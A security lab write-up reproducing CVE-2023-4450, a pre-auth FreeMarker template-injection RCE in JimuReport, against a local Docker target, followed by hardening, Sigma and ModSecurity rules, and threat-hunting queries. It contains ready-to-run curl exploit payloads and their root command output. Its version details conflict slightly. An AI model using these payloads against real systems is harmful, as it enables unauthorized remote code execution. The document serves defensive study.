# CVE-2023-4450 — JimuReport FreeMarker Server-Side Template Injection RCE

## 1. Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2023-4450 |
| Product | JeecgBoot JimuReport < 1.6.0 |
| Attack Vector | Network (Pre-Auth) |
| Impact | Remote Code Execution (with command output in response) |
| CVSS 3.1 | 9.8 Critical |
| Patch | 1.6.0 |

JimuReport's `/jmreport/queryFieldBySql` endpoint accepts user-supplied SQL that is rendered through the FreeMarker template engine before execution. An attacker can inject FreeMarker directives (e.g., `<#assign>` with `freemarker.template.utility.Execute`) to execute arbitrary OS commands. The command output is returned directly in the HTTP response — no blind exploitation needed.

## 2. Attack Chain

```
Recon: Identify JimuReport on port 8085 (/jmreport/list)
  └─▶ Craft: FreeMarker SSTI payload in SQL field
      └─▶ Deliver: POST /jmreport/queryFieldBySql (no auth)
          └─▶ Impact: RCE as root, output in JSON response
```

## 3. Reproduction

### Environment

```bash
cd ~/Security/tools/vulhub/jimureport/CVE-2023-4450
docker compose up -d
# JimuReport 1.6.0 on port 8085, wait ~20s for Spring Boot startup
```

### Step 1 — FreeMarker SSTI with Command Output

```bash
curl -s -X POST http://localhost:8085/jmreport/queryFieldBySql \
  -H "Content-Type: application/json" \
  -d '{"sql":"select '\''result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}'\''"}'
```

Response (command output embedded in JSON):
```json
{
  "success": true,
  "code": 200,
  "result": {
    "fieldList": [{
      "fieldName": "result: uid=0(root) gid=0(root) groups=0(root) "
    }]
  }
}
```

### Step 2 — Verify Arbitrary Command Execution

```bash
curl -s -X POST http://localhost:8085/jmreport/queryFieldBySql \
  -H "Content-Type: application/json" \
  -d '{"sql":"select '\''<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"touch /tmp/jimureport_ssti_rce\")}'\''"}'

docker exec cve-2023-4450-web-1 ls -la /tmp/jimureport_ssti_rce
# -rw-r--r-- 1 root root 0 ... /tmp/jimureport_ssti_rce
```

### Payload Breakdown

```
select 'result:<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}'
         │                          │                                        │
         │                          ▼                                        ▼
         │              Instantiate Execute class              Call exec("id")
         ▼
  SQL string context — FreeMarker renders before SQL executes
```

### Cleanup

```bash
docker compose down -v
```

## 4. Lessons Learned

- **Template engines are code execution engines**: FreeMarker's `?new()` built-in allows instantiating arbitrary Java classes — if user input reaches a template, it's game over.
- **SQL-as-template is a dangerous pattern**: JimuReport renders SQL through FreeMarker before execution, creating a direct SSTI vector in what appears to be a "data query" endpoint.
- **Output in response = zero-click exfil**: Unlike blind RCE, this returns command output directly — no need for reverse shells or OOB channels.
- **Pre-auth on an admin endpoint**: `/jmreport/queryFieldBySql` requires no authentication in default configuration.

## 5. Defense

### 5.1 Hardening

| Layer | Action |
|-------|--------|
| Application | Upgrade to JimuReport ≥ 1.6.1; disable `?new()` in FreeMarker config (`Configuration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER)`) |
| Authentication | Require authentication for all `/jmreport/` endpoints |
| FreeMarker sandbox | Use `freemarker.core.TemplateClassResolver.SAFER_RESOLVER` at minimum; block `freemarker.template.utility.Execute`, `ObjectConstructor`, `JythonRuntime` |
| Network | Restrict JimuReport to internal network; never expose port 8085 to internet |
| Container | Run as non-root, read-only filesystem, seccomp profile restricting `execve` |

### 5.2 Detection (SIEM / WAF Rules)

```yaml
# Sigma rule — FreeMarker SSTI in JimuReport
title: JimuReport CVE-2023-4450 FreeMarker SSTI
logsource:
  category: webserver
  product: any
detection:
  selection:
    cs-uri-stem|contains: '/jmreport/queryFieldBySql'
    cs-method: 'POST'
  keywords:
    cs-body|contains:
      - 'freemarker.template.utility.Execute'
      - '?new()'
      - '<#assign'
      - 'ObjectConstructor'
  condition: selection and keywords
  level: critical
```

```
# ModSecurity rule
SecRule REQUEST_URI "@contains /jmreport/queryFieldBySql" \
  "id:2023044501,phase:2,deny,status:403,\
   chain,msg:'CVE-2023-4450 JimuReport FreeMarker SSTI'"
  SecRule REQUEST_BODY "@rx (?i)(freemarker\.template\.utility|<#assign|\?new\(\))" ""
```

### 5.3 Threat Hunting

| Hypothesis | Data Source | Query Logic |
|------------|-------------|-------------|
| SSTI exploitation attempted | WAF / access logs | POST to `/jmreport/queryFieldBySql` with `<#assign`, `?new()`, or `Execute` in body |
| Successful RCE | Application response logs | Response containing OS command output patterns (`uid=`, `/bin/`, `root:x:`) |
| Post-exploitation | EDR / process tree | Child processes (sh, bash, curl, wget, python) spawned by Java/Spring Boot process |
| Data exfiltration | Network flows | Outbound connections from JimuReport container to external IPs |
| Persistence attempt | File integrity | New files in webroot or cron directories created by application user |

## 6. Tools & References

| Tool | Purpose |
|------|---------|
| curl | Single POST request exploit with output |
| docker / vulhub | Local vulnerable environment |

- [GitHub Advisory — GHSA-j8h5-8rrr-m6j9](https://github.com/advisories/GHSA-j8h5-8rrr-m6j9)
- [NVD — CVE-2023-4450](https://nvd.nist.gov/vuln/detail/CVE-2023-4450)
- [FreeMarker SSTI to Memory Shell](https://www.reajason.eu.org/writing/freemarkersstimemshell/)
- [FreeMarker Template Author's Guide — Built-ins](https://freemarker.apache.org/docs/ref_builtins.html)

## 7. Disclaimer

This reproduction was performed in an isolated Docker environment (vulhub) on localhost for educational purposes only. No production systems were targeted. The goal is to understand the vulnerability mechanism and develop effective detection/hardening strategies.
